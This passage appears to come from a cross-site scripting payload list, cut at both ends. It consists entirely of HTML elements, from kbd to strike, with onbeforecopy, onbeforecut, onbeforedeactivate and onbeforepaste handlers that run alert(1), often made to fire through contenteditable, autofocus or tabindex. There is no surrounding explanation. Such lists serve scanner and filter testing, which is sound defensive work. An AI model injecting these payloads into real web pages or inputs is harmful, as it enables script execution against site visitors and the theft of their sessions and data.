<kbd onbeforecopy="alert(1)" contenteditable>test</kbd>
<keygen onbeforecopy="alert(1)" contenteditable>test</keygen>
<label onbeforecopy="alert(1)" contenteditable>test</label>
<legend onbeforecopy="alert(1)" contenteditable>test</legend>
<li onbeforecopy="alert(1)" contenteditable>test</li>
<link onbeforecopy="alert(1)" contenteditable>test</link>
<listing onbeforecopy="alert(1)" contenteditable>test</listing>
<main onbeforecopy="alert(1)" contenteditable>test</main>
<map onbeforecopy="alert(1)" contenteditable>test</map>
<mark onbeforecopy="alert(1)" contenteditable>test</mark>
<marquee onbeforecopy="alert(1)" contenteditable>test</marquee>
<menu onbeforecopy="alert(1)" contenteditable>test</menu>
<menuitem onbeforecopy="alert(1)" contenteditable>test</menuitem>
<meta onbeforecopy="alert(1)" contenteditable>test</meta>
<meter onbeforecopy="alert(1)" contenteditable>test</meter>
<multicol onbeforecopy="alert(1)" contenteditable>test</multicol>
<nav onbeforecopy="alert(1)" contenteditable>test</nav>
<nextid onbeforecopy="alert(1)" contenteditable>test</nextid>
<nobr onbeforecopy="alert(1)" contenteditable>test</nobr>
<noembed onbeforecopy="alert(1)" contenteditable>test</noembed>
<noframes onbeforecopy="alert(1)" contenteditable>test</noframes>
<noscript onbeforecopy="alert(1)" contenteditable>test</noscript>
<object onbeforecopy="alert(1)" contenteditable>test</object>
<ol onbeforecopy="alert(1)" contenteditable>test</ol>
<optgroup onbeforecopy="alert(1)" contenteditable>test</optgroup>
<option onbeforecopy="alert(1)" contenteditable>test</option>
<output onbeforecopy="alert(1)" contenteditable>test</output>
<p onbeforecopy="alert(1)" contenteditable>test</p>
<param onbeforecopy="alert(1)" contenteditable>test</param>
<picture onbeforecopy="alert(1)" contenteditable>test</picture>
<plaintext onbeforecopy="alert(1)" contenteditable>test</plaintext>
<pre onbeforecopy="alert(1)" contenteditable>test</pre>
<progress onbeforecopy="alert(1)" contenteditable>test</progress>
<q onbeforecopy="alert(1)" contenteditable>test</q>
<rb onbeforecopy="alert(1)" contenteditable>test</rb>
<rp onbeforecopy="alert(1)" contenteditable>test</rp>
<rt onbeforecopy="alert(1)" contenteditable>test</rt>
<rtc onbeforecopy="alert(1)" contenteditable>test</rtc>
<ruby onbeforecopy="alert(1)" contenteditable>test</ruby>
<s onbeforecopy="alert(1)" contenteditable>test</s>
<samp onbeforecopy="alert(1)" contenteditable>test</samp>
<script onbeforecopy="alert(1)" contenteditable>test</script>
<section onbeforecopy="alert(1)" contenteditable>test</section>
<select onbeforecopy="alert(1)" contenteditable>test</select>
<shadow onbeforecopy="alert(1)" contenteditable>test</shadow>
<slot onbeforecopy="alert(1)" contenteditable>test</slot>
<small onbeforecopy="alert(1)" contenteditable>test</small>
<source onbeforecopy="alert(1)" contenteditable>test</source>
<spacer onbeforecopy="alert(1)" contenteditable>test</spacer>
<span onbeforecopy="alert(1)" contenteditable>test</span>
<strike onbeforecopy="alert(1)" contenteditable>test</strike>
<strong onbeforecopy="alert(1)" contenteditable>test</strong>
<style onbeforecopy="alert(1)" contenteditable>test</style>
<sub onbeforecopy="alert(1)" contenteditable>test</sub>
<summary onbeforecopy="alert(1)" contenteditable>test</summary>
<sup onbeforecopy="alert(1)" contenteditable>test</sup>
<svg onbeforecopy="alert(1)" contenteditable>test</svg>
<table onbeforecopy="alert(1)" contenteditable>test</table>
<tbody onbeforecopy="alert(1)" contenteditable>test</tbody>
<td onbeforecopy="alert(1)" contenteditable>test</td>
<template onbeforecopy="alert(1)" contenteditable>test</template>
<tfoot onbeforecopy="alert(1)" contenteditable>test</tfoot>
<th onbeforecopy="alert(1)" contenteditable>test</th>
<thead onbeforecopy="alert(1)" contenteditable>test</thead>
<time onbeforecopy="alert(1)" contenteditable>test</time>
<title onbeforecopy="alert(1)" contenteditable>test</title>
<tr onbeforecopy="alert(1)" contenteditable>test</tr>
<track onbeforecopy="alert(1)" contenteditable>test</track>
<tt onbeforecopy="alert(1)" contenteditable>test</tt>
<u onbeforecopy="alert(1)" contenteditable>test</u>
<ul onbeforecopy="alert(1)" contenteditable>test</ul>
<var onbeforecopy="alert(1)" contenteditable>test</var>
<video onbeforecopy="alert(1)" contenteditable>test</video>
<wbr onbeforecopy="alert(1)" contenteditable>test</wbr>
<xmp onbeforecopy="alert(1)" contenteditable>test</xmp>
<input onbeforecut=alert(1) value="XSS" autofocus>
<textarea onbeforecut=alert(1) autofocus>XSS</textarea>
<a onbeforecut="alert(1)" contenteditable>test</a>
<abbr onbeforecut="alert(1)" contenteditable>test</abbr>
<acronym onbeforecut="alert(1)" contenteditable>test</acronym>
<address onbeforecut="alert(1)" contenteditable>test</address>
<applet onbeforecut="alert(1)" contenteditable>test</applet>
<area onbeforecut="alert(1)" contenteditable>test</area>
<article onbeforecut="alert(1)" contenteditable>test</article>
<aside onbeforecut="alert(1)" contenteditable>test</aside>
<audio onbeforecut="alert(1)" contenteditable>test</audio>
<b onbeforecut="alert(1)" contenteditable>test</b>
<base onbeforecut="alert(1)" contenteditable>test</base>
<basefont onbeforecut="alert(1)" contenteditable>test</basefont>
<bdi onbeforecut="alert(1)" contenteditable>test</bdi>
<bdo onbeforecut="alert(1)" contenteditable>test</bdo>
<bgsound onbeforecut="alert(1)" contenteditable>test</bgsound>
<big onbeforecut="alert(1)" contenteditable>test</big>
<blink onbeforecut="alert(1)" contenteditable>test</blink>
<blockquote onbeforecut="alert(1)" contenteditable>test</blockquote>
<body onbeforecut="alert(1)" contenteditable>test</body>
<br onbeforecut="alert(1)" contenteditable>test</br>
<button onbeforecut="alert(1)" contenteditable>test</button>
<canvas onbeforecut="alert(1)" contenteditable>test</canvas>
<caption onbeforecut="alert(1)" contenteditable>test</caption>
<center onbeforecut="alert(1)" contenteditable>test</center>
<cite onbeforecut="alert(1)" contenteditable>test</cite>
<code onbeforecut="alert(1)" contenteditable>test</code>
<col onbeforecut="alert(1)" contenteditable>test</col>
<colgroup onbeforecut="alert(1)" contenteditable>test</colgroup>
<command onbeforecut="alert(1)" contenteditable>test</command>
<content onbeforecut="alert(1)" contenteditable>test</content>
<data onbeforecut="alert(1)" contenteditable>test</data>
<datalist onbeforecut="alert(1)" contenteditable>test</datalist>
<dd onbeforecut="alert(1)" contenteditable>test</dd>
<del onbeforecut="alert(1)" contenteditable>test</del>
<details onbeforecut="alert(1)" contenteditable>test</details>
<dfn onbeforecut="alert(1)" contenteditable>test</dfn>
<dialog onbeforecut="alert(1)" contenteditable>test</dialog>
<dir onbeforecut="alert(1)" contenteditable>test</dir>
<div onbeforecut="alert(1)" contenteditable>test</div>
<dl onbeforecut="alert(1)" contenteditable>test</dl>
<dt onbeforecut="alert(1)" contenteditable>test</dt>
<element onbeforecut="alert(1)" contenteditable>test</element>
<em onbeforecut="alert(1)" contenteditable>test</em>
<embed onbeforecut="alert(1)" contenteditable>test</embed>
<fieldset onbeforecut="alert(1)" contenteditable>test</fieldset>
<figcaption onbeforecut="alert(1)" contenteditable>test</figcaption>
<figure onbeforecut="alert(1)" contenteditable>test</figure>
<font onbeforecut="alert(1)" contenteditable>test</font>
<footer onbeforecut="alert(1)" contenteditable>test</footer>
<form onbeforecut="alert(1)" contenteditable>test</form>
<frame onbeforecut="alert(1)" contenteditable>test</frame>
<frameset onbeforecut="alert(1)" contenteditable>test</frameset>
<h1 onbeforecut="alert(1)" contenteditable>test</h1>
<head onbeforecut="alert(1)" contenteditable>test</head>
<header onbeforecut="alert(1)" contenteditable>test</header>
<hgroup onbeforecut="alert(1)" contenteditable>test</hgroup>
<hr onbeforecut="alert(1)" contenteditable>test</hr>
<html onbeforecut="alert(1)" contenteditable>test</html>
<i onbeforecut="alert(1)" contenteditable>test</i>
<iframe onbeforecut="alert(1)" contenteditable>test</iframe>
<image onbeforecut="alert(1)" contenteditable>test</image>
<img onbeforecut="alert(1)" contenteditable>test</img>
<ins onbeforecut="alert(1)" contenteditable>test</ins>
<isindex onbeforecut="alert(1)" contenteditable>test</isindex>
<kbd onbeforecut="alert(1)" contenteditable>test</kbd>
<keygen onbeforecut="alert(1)" contenteditable>test</keygen>
<label onbeforecut="alert(1)" contenteditable>test</label>
<legend onbeforecut="alert(1)" contenteditable>test</legend>
<li onbeforecut="alert(1)" contenteditable>test</li>
<link onbeforecut="alert(1)" contenteditable>test</link>
<listing onbeforecut="alert(1)" contenteditable>test</listing>
<main onbeforecut="alert(1)" contenteditable>test</main>
<map onbeforecut="alert(1)" contenteditable>test</map>
<mark onbeforecut="alert(1)" contenteditable>test</mark>
<marquee onbeforecut="alert(1)" contenteditable>test</marquee>
<menu onbeforecut="alert(1)" contenteditable>test</menu>
<menuitem onbeforecut="alert(1)" contenteditable>test</menuitem>
<meta onbeforecut="alert(1)" contenteditable>test</meta>
<meter onbeforecut="alert(1)" contenteditable>test</meter>
<multicol onbeforecut="alert(1)" contenteditable>test</multicol>
<nav onbeforecut="alert(1)" contenteditable>test</nav>
<nextid onbeforecut="alert(1)" contenteditable>test</nextid>
<nobr onbeforecut="alert(1)" contenteditable>test</nobr>
<noembed onbeforecut="alert(1)" contenteditable>test</noembed>
<noframes onbeforecut="alert(1)" contenteditable>test</noframes>
<noscript onbeforecut="alert(1)" contenteditable>test</noscript>
<object onbeforecut="alert(1)" contenteditable>test</object>
<ol onbeforecut="alert(1)" contenteditable>test</ol>
<optgroup onbeforecut="alert(1)" contenteditable>test</optgroup>
<option onbeforecut="alert(1)" contenteditable>test</option>
<output onbeforecut="alert(1)" contenteditable>test</output>
<p onbeforecut="alert(1)" contenteditable>test</p>
<param onbeforecut="alert(1)" contenteditable>test</param>
<picture onbeforecut="alert(1)" contenteditable>test</picture>
<plaintext onbeforecut="alert(1)" contenteditable>test</plaintext>
<pre onbeforecut="alert(1)" contenteditable>test</pre>
<progress onbeforecut="alert(1)" contenteditable>test</progress>
<q onbeforecut="alert(1)" contenteditable>test</q>
<rb onbeforecut="alert(1)" contenteditable>test</rb>
<rp onbeforecut="alert(1)" contenteditable>test</rp>
<rt onbeforecut="alert(1)" contenteditable>test</rt>
<rtc onbeforecut="alert(1)" contenteditable>test</rtc>
<ruby onbeforecut="alert(1)" contenteditable>test</ruby>
<s onbeforecut="alert(1)" contenteditable>test</s>
<samp onbeforecut="alert(1)" contenteditable>test</samp>
<script onbeforecut="alert(1)" contenteditable>test</script>
<section onbeforecut="alert(1)" contenteditable>test</section>
<select onbeforecut="alert(1)" contenteditable>test</select>
<shadow onbeforecut="alert(1)" contenteditable>test</shadow>
<slot onbeforecut="alert(1)" contenteditable>test</slot>
<small onbeforecut="alert(1)" contenteditable>test</small>
<source onbeforecut="alert(1)" contenteditable>test</source>
<spacer onbeforecut="alert(1)" contenteditable>test</spacer>
<span onbeforecut="alert(1)" contenteditable>test</span>
<strike onbeforecut="alert(1)" contenteditable>test</strike>
<strong onbeforecut="alert(1)" contenteditable>test</strong>
<style onbeforecut="alert(1)" contenteditable>test</style>
<sub onbeforecut="alert(1)" contenteditable>test</sub>
<summary onbeforecut="alert(1)" contenteditable>test</summary>
<sup onbeforecut="alert(1)" contenteditable>test</sup>
<svg onbeforecut="alert(1)" contenteditable>test</svg>
<table onbeforecut="alert(1)" contenteditable>test</table>
<tbody onbeforecut="alert(1)" contenteditable>test</tbody>
<td onbeforecut="alert(1)" contenteditable>test</td>
<template onbeforecut="alert(1)" contenteditable>test</template>
<tfoot onbeforecut="alert(1)" contenteditable>test</tfoot>
<th onbeforecut="alert(1)" contenteditable>test</th>
<thead onbeforecut="alert(1)" contenteditable>test</thead>
<time onbeforecut="alert(1)" contenteditable>test</time>
<title onbeforecut="alert(1)" contenteditable>test</title>
<tr onbeforecut="alert(1)" contenteditable>test</tr>
<track onbeforecut="alert(1)" contenteditable>test</track>
<tt onbeforecut="alert(1)" contenteditable>test</tt>
<u onbeforecut="alert(1)" contenteditable>test</u>
<ul onbeforecut="alert(1)" contenteditable>test</ul>
<var onbeforecut="alert(1)" contenteditable>test</var>
<video onbeforecut="alert(1)" contenteditable>test</video>
<wbr onbeforecut="alert(1)" contenteditable>test</wbr>
<xmp onbeforecut="alert(1)" contenteditable>test</xmp>
<a id=x tabindex=1 onbeforedeactivate=alert(1)></a><input autofocus>
<abbr id=x tabindex=1 onbeforedeactivate=alert(1)></abbr><input autofocus>
<acronym id=x tabindex=1 onbeforedeactivate=alert(1)></acronym><input autofocus>
<address id=x tabindex=1 onbeforedeactivate=alert(1)></address><input autofocus>
<applet id=x tabindex=1 onbeforedeactivate=alert(1)></applet><input autofocus>
<area id=x tabindex=1 onbeforedeactivate=alert(1)></area><input autofocus>
<article id=x tabindex=1 onbeforedeactivate=alert(1)></article><input autofocus>
<aside id=x tabindex=1 onbeforedeactivate=alert(1)></aside><input autofocus>
<audio id=x tabindex=1 onbeforedeactivate=alert(1)></audio><input autofocus>
<b id=x tabindex=1 onbeforedeactivate=alert(1)></b><input autofocus>
<base id=x tabindex=1 onbeforedeactivate=alert(1)></base><input autofocus>
<basefont id=x tabindex=1 onbeforedeactivate=alert(1)></basefont><input autofocus>
<bdi id=x tabindex=1 onbeforedeactivate=alert(1)></bdi><input autofocus>
<bdo id=x tabindex=1 onbeforedeactivate=alert(1)></bdo><input autofocus>
<bgsound id=x tabindex=1 onbeforedeactivate=alert(1)></bgsound><input autofocus>
<big id=x tabindex=1 onbeforedeactivate=alert(1)></big><input autofocus>
<blink id=x tabindex=1 onbeforedeactivate=alert(1)></blink><input autofocus>
<blockquote id=x tabindex=1 onbeforedeactivate=alert(1)></blockquote><input autofocus>
<body id=x tabindex=1 onbeforedeactivate=alert(1)></body><input autofocus>
<br id=x tabindex=1 onbeforedeactivate=alert(1)></br><input autofocus>
<button id=x tabindex=1 onbeforedeactivate=alert(1)></button><input autofocus>
<canvas id=x tabindex=1 onbeforedeactivate=alert(1)></canvas><input autofocus>
<caption id=x tabindex=1 onbeforedeactivate=alert(1)></caption><input autofocus>
<center id=x tabindex=1 onbeforedeactivate=alert(1)></center><input autofocus>
<cite id=x tabindex=1 onbeforedeactivate=alert(1)></cite><input autofocus>
<code id=x tabindex=1 onbeforedeactivate=alert(1)></code><input autofocus>
<col id=x tabindex=1 onbeforedeactivate=alert(1)></col><input autofocus>
<colgroup id=x tabindex=1 onbeforedeactivate=alert(1)></colgroup><input autofocus>
<command id=x tabindex=1 onbeforedeactivate=alert(1)></command><input autofocus>
<content id=x tabindex=1 onbeforedeactivate=alert(1)></content><input autofocus>
<data id=x tabindex=1 onbeforedeactivate=alert(1)></data><input autofocus>
<datalist id=x tabindex=1 onbeforedeactivate=alert(1)></datalist><input autofocus>
<dd id=x tabindex=1 onbeforedeactivate=alert(1)></dd><input autofocus>
<del id=x tabindex=1 onbeforedeactivate=alert(1)></del><input autofocus>
<details id=x tabindex=1 onbeforedeactivate=alert(1)></details><input autofocus>
<dfn id=x tabindex=1 onbeforedeactivate=alert(1)></dfn><input autofocus>
<dialog id=x tabindex=1 onbeforedeactivate=alert(1)></dialog><input autofocus>
<dir id=x tabindex=1 onbeforedeactivate=alert(1)></dir><input autofocus>
<div id=x tabindex=1 onbeforedeactivate=alert(1)></div><input autofocus>
<dl id=x tabindex=1 onbeforedeactivate=alert(1)></dl><input autofocus>
<dt id=x tabindex=1 onbeforedeactivate=alert(1)></dt><input autofocus>
<element id=x tabindex=1 onbeforedeactivate=alert(1)></element><input autofocus>
<em id=x tabindex=1 onbeforedeactivate=alert(1)></em><input autofocus>
<embed id=x tabindex=1 onbeforedeactivate=alert(1)></embed><input autofocus>
<fieldset id=x tabindex=1 onbeforedeactivate=alert(1)></fieldset><input autofocus>
<figcaption id=x tabindex=1 onbeforedeactivate=alert(1)></figcaption><input autofocus>
<figure id=x tabindex=1 onbeforedeactivate=alert(1)></figure><input autofocus>
<font id=x tabindex=1 onbeforedeactivate=alert(1)></font><input autofocus>
<footer id=x tabindex=1 onbeforedeactivate=alert(1)></footer><input autofocus>
<form id=x tabindex=1 onbeforedeactivate=alert(1)></form><input autofocus>
<frame id=x tabindex=1 onbeforedeactivate=alert(1)></frame><input autofocus>
<frameset id=x tabindex=1 onbeforedeactivate=alert(1)></frameset><input autofocus>
<h1 id=x tabindex=1 onbeforedeactivate=alert(1)></h1><input autofocus>
<head id=x tabindex=1 onbeforedeactivate=alert(1)></head><input autofocus>
<header id=x tabindex=1 onbeforedeactivate=alert(1)></header><input autofocus>
<hgroup id=x tabindex=1 onbeforedeactivate=alert(1)></hgroup><input autofocus>
<hr id=x tabindex=1 onbeforedeactivate=alert(1)></hr><input autofocus>
<html id=x tabindex=1 onbeforedeactivate=alert(1)></html><input autofocus>
<i id=x tabindex=1 onbeforedeactivate=alert(1)></i><input autofocus>
<iframe id=x tabindex=1 onbeforedeactivate=alert(1)></iframe><input autofocus>
<image id=x tabindex=1 onbeforedeactivate=alert(1)></image><input autofocus>
<img id=x tabindex=1 onbeforedeactivate=alert(1)></img><input autofocus>
<input id=x tabindex=1 onbeforedeactivate=alert(1)></input><input autofocus>
<ins id=x tabindex=1 onbeforedeactivate=alert(1)></ins><input autofocus>
<isindex id=x tabindex=1 onbeforedeactivate=alert(1)></isindex><input autofocus>
<kbd id=x tabindex=1 onbeforedeactivate=alert(1)></kbd><input autofocus>
<keygen id=x tabindex=1 onbeforedeactivate=alert(1)></keygen><input autofocus>
<label id=x tabindex=1 onbeforedeactivate=alert(1)></label><input autofocus>
<legend id=x tabindex=1 onbeforedeactivate=alert(1)></legend><input autofocus>
<li id=x tabindex=1 onbeforedeactivate=alert(1)></li><input autofocus>
<link id=x tabindex=1 onbeforedeactivate=alert(1)></link><input autofocus>
<listing id=x tabindex=1 onbeforedeactivate=alert(1)></listing><input autofocus>
<main id=x tabindex=1 onbeforedeactivate=alert(1)></main><input autofocus>
<map id=x tabindex=1 onbeforedeactivate=alert(1)></map><input autofocus>
<mark id=x tabindex=1 onbeforedeactivate=alert(1)></mark><input autofocus>
<marquee id=x tabindex=1 onbeforedeactivate=alert(1)></marquee><input autofocus>
<menu id=x tabindex=1 onbeforedeactivate=alert(1)></menu><input autofocus>
<menuitem id=x tabindex=1 onbeforedeactivate=alert(1)></menuitem><input autofocus>
<meta id=x tabindex=1 onbeforedeactivate=alert(1)></meta><input autofocus>
<meter id=x tabindex=1 onbeforedeactivate=alert(1)></meter><input autofocus>
<multicol id=x tabindex=1 onbeforedeactivate=alert(1)></multicol><input autofocus>
<nav id=x tabindex=1 onbeforedeactivate=alert(1)></nav><input autofocus>
<nextid id=x tabindex=1 onbeforedeactivate=alert(1)></nextid><input autofocus>
<nobr id=x tabindex=1 onbeforedeactivate=alert(1)></nobr><input autofocus>
<noembed id=x tabindex=1 onbeforedeactivate=alert(1)></noembed><input autofocus>
<noframes id=x tabindex=1 onbeforedeactivate=alert(1)></noframes><input autofocus>
<noscript id=x tabindex=1 onbeforedeactivate=alert(1)></noscript><input autofocus>
<object id=x tabindex=1 onbeforedeactivate=alert(1)></object><input autofocus>
<ol id=x tabindex=1 onbeforedeactivate=alert(1)></ol><input autofocus>
<optgroup id=x tabindex=1 onbeforedeactivate=alert(1)></optgroup><input autofocus>
<option id=x tabindex=1 onbeforedeactivate=alert(1)></option><input autofocus>
<output id=x tabindex=1 onbeforedeactivate=alert(1)></output><input autofocus>
<p id=x tabindex=1 onbeforedeactivate=alert(1)></p><input autofocus>
<param id=x tabindex=1 onbeforedeactivate=alert(1)></param><input autofocus>
<picture id=x tabindex=1 onbeforedeactivate=alert(1)></picture><input autofocus>
<plaintext id=x tabindex=1 onbeforedeactivate=alert(1)></plaintext><input autofocus>
<pre id=x tabindex=1 onbeforedeactivate=alert(1)></pre><input autofocus>
<progress id=x tabindex=1 onbeforedeactivate=alert(1)></progress><input autofocus>
<q id=x tabindex=1 onbeforedeactivate=alert(1)></q><input autofocus>
<rb id=x tabindex=1 onbeforedeactivate=alert(1)></rb><input autofocus>
<rp id=x tabindex=1 onbeforedeactivate=alert(1)></rp><input autofocus>
<rt id=x tabindex=1 onbeforedeactivate=alert(1)></rt><input autofocus>
<rtc id=x tabindex=1 onbeforedeactivate=alert(1)></rtc><input autofocus>
<ruby id=x tabindex=1 onbeforedeactivate=alert(1)></ruby><input autofocus>
<s id=x tabindex=1 onbeforedeactivate=alert(1)></s><input autofocus>
<samp id=x tabindex=1 onbeforedeactivate=alert(1)></samp><input autofocus>
<script id=x tabindex=1 onbeforedeactivate=alert(1)></script><input autofocus>
<section id=x tabindex=1 onbeforedeactivate=alert(1)></section><input autofocus>
<select id=x tabindex=1 onbeforedeactivate=alert(1)></select><input autofocus>
<shadow id=x tabindex=1 onbeforedeactivate=alert(1)></shadow><input autofocus>
<slot id=x tabindex=1 onbeforedeactivate=alert(1)></slot><input autofocus>
<small id=x tabindex=1 onbeforedeactivate=alert(1)></small><input autofocus>
<source id=x tabindex=1 onbeforedeactivate=alert(1)></source><input autofocus>
<spacer id=x tabindex=1 onbeforedeactivate=alert(1)></spacer><input autofocus>
<span id=x tabindex=1 onbeforedeactivate=alert(1)></span><input autofocus>
<strike id=x tabindex=1 onbeforedeactivate=alert(1)></strike><input autofocus>
<strong id=x tabindex=1 onbeforedeactivate=alert(1)></strong><input autofocus>
<style id=x tabindex=1 onbeforedeactivate=alert(1)></style><input autofocus>
<sub id=x tabindex=1 onbeforedeactivate=alert(1)></sub><input autofocus>
<summary id=x tabindex=1 onbeforedeactivate=alert(1)></summary><input autofocus>
<sup id=x tabindex=1 onbeforedeactivate=alert(1)></sup><input autofocus>
<svg id=x tabindex=1 onbeforedeactivate=alert(1)></svg><input autofocus>
<table id=x tabindex=1 onbeforedeactivate=alert(1)></table><input autofocus>
<tbody id=x tabindex=1 onbeforedeactivate=alert(1)></tbody><input autofocus>
<td id=x tabindex=1 onbeforedeactivate=alert(1)></td><input autofocus>
<template id=x tabindex=1 onbeforedeactivate=alert(1)></template><input autofocus>
<textarea id=x tabindex=1 onbeforedeactivate=alert(1)></textarea><input autofocus>
<tfoot id=x tabindex=1 onbeforedeactivate=alert(1)></tfoot><input autofocus>
<th id=x tabindex=1 onbeforedeactivate=alert(1)></th><input autofocus>
<thead id=x tabindex=1 onbeforedeactivate=alert(1)></thead><input autofocus>
<time id=x tabindex=1 onbeforedeactivate=alert(1)></time><input autofocus>
<title id=x tabindex=1 onbeforedeactivate=alert(1)></title><input autofocus>
<tr id=x tabindex=1 onbeforedeactivate=alert(1)></tr><input autofocus>
<track id=x tabindex=1 onbeforedeactivate=alert(1)></track><input autofocus>
<tt id=x tabindex=1 onbeforedeactivate=alert(1)></tt><input autofocus>
<u id=x tabindex=1 onbeforedeactivate=alert(1)></u><input autofocus>
<ul id=x tabindex=1 onbeforedeactivate=alert(1)></ul><input autofocus>
<var id=x tabindex=1 onbeforedeactivate=alert(1)></var><input autofocus>
<video id=x tabindex=1 onbeforedeactivate=alert(1)></video><input autofocus>
<wbr id=x tabindex=1 onbeforedeactivate=alert(1)></wbr><input autofocus>
<xmp id=x tabindex=1 onbeforedeactivate=alert(1)></xmp><input autofocus>
<xss id=x tabindex=1 onbeforedeactivate=alert(1)></xss><input autofocus>
<input onbeforepaste=alert(1) value="" autofocus>
<textarea onbeforepaste=alert(1) autofocus></textarea>
<a onbeforepaste="alert(1)" contenteditable>test</a>
<abbr onbeforepaste="alert(1)" contenteditable>test</abbr>
<acronym onbeforepaste="alert(1)" contenteditable>test</acronym>
<address onbeforepaste="alert(1)" contenteditable>test</address>
<applet onbeforepaste="alert(1)" contenteditable>test</applet>
<area onbeforepaste="alert(1)" contenteditable>test</area>
<article onbeforepaste="alert(1)" contenteditable>test</article>
<aside onbeforepaste="alert(1)" contenteditable>test</aside>
<audio onbeforepaste="alert(1)" contenteditable>test</audio>
<b onbeforepaste="alert(1)" contenteditable>test</b>
<base onbeforepaste="alert(1)" contenteditable>test</base>
<basefont onbeforepaste="alert(1)" contenteditable>test</basefont>
<bdi onbeforepaste="alert(1)" contenteditable>test</bdi>
<bdo onbeforepaste="alert(1)" contenteditable>test</bdo>
<bgsound onbeforepaste="alert(1)" contenteditable>test</bgsound>
<big onbeforepaste="alert(1)" contenteditable>test</big>
<blink onbeforepaste="alert(1)" contenteditable>test</blink>
<blockquote onbeforepaste="alert(1)" contenteditable>test</blockquote>
<body onbeforepaste="alert(1)" contenteditable>test</body>
<br onbeforepaste="alert(1)" contenteditable>test</br>
<button onbeforepaste="alert(1)" contenteditable>test</button>
<canvas onbeforepaste="alert(1)" contenteditable>test</canvas>
<caption onbeforepaste="alert(1)" contenteditable>test</caption>
<center onbeforepaste="alert(1)" contenteditable>test</center>
<cite onbeforepaste="alert(1)" contenteditable>test</cite>
<code onbeforepaste="alert(1)" contenteditable>test</code>
<col onbeforepaste="alert(1)" contenteditable>test</col>
<colgroup onbeforepaste="alert(1)" contenteditable>test</colgroup>
<command onbeforepaste="alert(1)" contenteditable>test</command>
<content onbeforepaste="alert(1)" contenteditable>test</content>
<data onbeforepaste="alert(1)" contenteditable>test</data>
<datalist onbeforepaste="alert(1)" contenteditable>test</datalist>
<dd onbeforepaste="alert(1)" contenteditable>test</dd>
<del onbeforepaste="alert(1)" contenteditable>test</del>
<details onbeforepaste="alert(1)" contenteditable>test</details>
<dfn onbeforepaste="alert(1)" contenteditable>test</dfn>
<dialog onbeforepaste="alert(1)" contenteditable>test</dialog>
<dir onbeforepaste="alert(1)" contenteditable>test</dir>
<div onbeforepaste="alert(1)" contenteditable>test</div>
<dl onbeforepaste="alert(1)" contenteditable>test</dl>
<dt onbeforepaste="alert(1)" contenteditable>test</dt>
<element onbeforepaste="alert(1)" contenteditable>test</element>
<em onbeforepaste="alert(1)" contenteditable>test</em>
<embed onbeforepaste="alert(1)" contenteditable>test</embed>
<fieldset onbeforepaste="alert(1)" contenteditable>test</fieldset>
<figcaption onbeforepaste="alert(1)" contenteditable>test</figcaption>
<figure onbeforepaste="alert(1)" contenteditable>test</figure>
<font onbeforepaste="alert(1)" contenteditable>test</font>
<footer onbeforepaste="alert(1)" contenteditable>test</footer>
<form onbeforepaste="alert(1)" contenteditable>test</form>
<frame onbeforepaste="alert(1)" contenteditable>test</frame>
<frameset onbeforepaste="alert(1)" contenteditable>test</frameset>
<h1 onbeforepaste="alert(1)" contenteditable>test</h1>
<head onbeforepaste="alert(1)" contenteditable>test</head>
<header onbeforepaste="alert(1)" contenteditable>test</header>
<hgroup onbeforepaste="alert(1)" contenteditable>test</hgroup>
<hr onbeforepaste="alert(1)" contenteditable>test</hr>
<html onbeforepaste="alert(1)" contenteditable>test</html>
<i onbeforepaste="alert(1)" contenteditable>test</i>
<iframe onbeforepaste="alert(1)" contenteditable>test</iframe>
<image onbeforepaste="alert(1)" contenteditable>test</image>
<img onbeforepaste="alert(1)" contenteditable>test</img>
<ins onbeforepaste="alert(1)" contenteditable>test</ins>
<isindex onbeforepaste="alert(1)" contenteditable>test</isindex>
<kbd onbeforepaste="alert(1)" contenteditable>test</kbd>
<keygen onbeforepaste="alert(1)" contenteditable>test</keygen>
<label onbeforepaste="alert(1)" contenteditable>test</label>
<legend onbeforepaste="alert(1)" contenteditable>test</legend>
<li onbeforepaste="alert(1)" contenteditable>test</li>
<link onbeforepaste="alert(1)" contenteditable>test</link>
<listing onbeforepaste="alert(1)" contenteditable>test</listing>
<main onbeforepaste="alert(1)" contenteditable>test</main>
<map onbeforepaste="alert(1)" contenteditable>test</map>
<mark onbeforepaste="alert(1)" contenteditable>test</mark>
<marquee onbeforepaste="alert(1)" contenteditable>test</marquee>
<menu onbeforepaste="alert(1)" contenteditable>test</menu>
<menuitem onbeforepaste="alert(1)" contenteditable>test</menuitem>
<meta onbeforepaste="alert(1)" contenteditable>test</meta>
<meter onbeforepaste="alert(1)" contenteditable>test</meter>
<multicol onbeforepaste="alert(1)" contenteditable>test</multicol>
<nav onbeforepaste="alert(1)" contenteditable>test</nav>
<nextid onbeforepaste="alert(1)" contenteditable>test</nextid>
<nobr onbeforepaste="alert(1)" contenteditable>test</nobr>
<noembed onbeforepaste="alert(1)" contenteditable>test</noembed>
<noframes onbeforepaste="alert(1)" contenteditable>test</noframes>
<noscript onbeforepaste="alert(1)" contenteditable>test</noscript>
<object onbeforepaste="alert(1)" contenteditable>test</object>
<ol onbeforepaste="alert(1)" contenteditable>test</ol>
<optgroup onbeforepaste="alert(1)" contenteditable>test</optgroup>
<option onbeforepaste="alert(1)" contenteditable>test</option>
<output onbeforepaste="alert(1)" contenteditable>test</output>
<p onbeforepaste="alert(1)" contenteditable>test</p>
<param onbeforepaste="alert(1)" contenteditable>test</param>
<picture onbeforepaste="alert(1)" contenteditable>test</picture>
<plaintext onbeforepaste="alert(1)" contenteditable>test</plaintext>
<pre onbeforepaste="alert(1)" contenteditable>test</pre>
<progress onbeforepaste="alert(1)" contenteditable>test</progress>
<q onbeforepaste="alert(1)" contenteditable>test</q>
<rb onbeforepaste="alert(1)" contenteditable>test</rb>
<rp onbeforepaste="alert(1)" contenteditable>test</rp>
<rt onbeforepaste="alert(1)" contenteditable>test</rt>
<rtc onbeforepaste="alert(1)" contenteditable>test</rtc>
<ruby onbeforepaste="alert(1)" contenteditable>test</ruby>
<s onbeforepaste="alert(1)" contenteditable>test</s>
<samp onbeforepaste="alert(1)" contenteditable>test</samp>
<script onbeforepaste="alert(1)" contenteditable>test</script>
<section onbeforepaste="alert(1)" contenteditable>test</section>
<select onbeforepaste="alert(1)" contenteditable>test</select>
<shadow onbeforepaste="alert(1)" contenteditable>test</shadow>
<slot onbeforepaste="alert(1)" contenteditable>test</slot>
<small onbeforepaste="alert(1)" contenteditable>test</small>
<source onbeforepaste="alert(1)" contenteditable>test</source>
<spacer onbeforepaste="alert(1)" contenteditable>test</spacer>
<span onbeforepaste="alert(1)" contenteditable>test</span>
<strike onbeforepaste="alert(1)" contenteditable>test</strike>
